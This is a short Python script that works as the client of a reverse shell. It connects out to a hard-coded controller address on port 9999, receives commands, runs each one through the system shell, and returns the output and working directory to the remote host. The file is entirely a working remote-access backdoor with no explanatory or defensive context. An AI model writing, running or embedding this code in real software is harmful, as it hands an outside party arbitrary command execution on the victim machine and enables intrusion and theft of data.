#!/usr/bin/env python

import socket
import subprocess
import os

s = socket.socket()
host = '192.168.5.101'
port = 9999
try:
    print("Requesting connection ...")
    s.connect((host, port))
    print("Connection established sucessfully!")
except:
    print("*************************************")
    print("HOST is not live! Try again later.")
    print("*************************************")
    quit()
while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        try:
            os.chdir(data[3:].decode("utf-8"))
        except os.error as msg:
            s.send("Os error".encode("utf-8") + str(msg).encode("utf-8"))
            s.send("Note: Always use cd with absolute path.".encode("utf-8"))
            data = ''
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, )
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        print(output_str)
        s.send(output_byte + os.getcwd().encode("utf-8")[-25:] + '> '.encode("utf-8"))

# Close connection
s.close()
